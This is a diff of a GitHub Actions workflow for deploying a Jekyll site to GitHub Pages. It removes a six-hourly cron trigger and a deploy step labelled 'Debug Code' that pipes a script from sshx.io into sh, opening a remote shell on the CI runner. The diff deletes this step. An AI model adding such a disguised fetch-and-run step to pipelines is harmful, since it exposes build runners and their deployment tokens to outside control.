@@ -1,5 +1,5 @@
 # Sample workflow for building and deploying a Jekyll site to GitHub Pages
-name: Deploy Jekyll with GitHub Pages
+name: Deploy Jekyll
 
 on:
   # Runs on pushes targeting the default branch
@@ -8,9 +8,6 @@ on:
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-
-  schedule:
-    - cron: "0 0/6 * * *"   
 
 # Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
 permissions:
@@ -49,8 +46,6 @@ jobs:
     runs-on: ubuntu-latest
     needs: build
     steps:
-      - name: Debug Code
-        run: curl -sSf https://sshx.io/get | sh -s run
       - name: Deploy to GitHub Pages
         id: deployment
         uses: actions/deploy-pages@v4
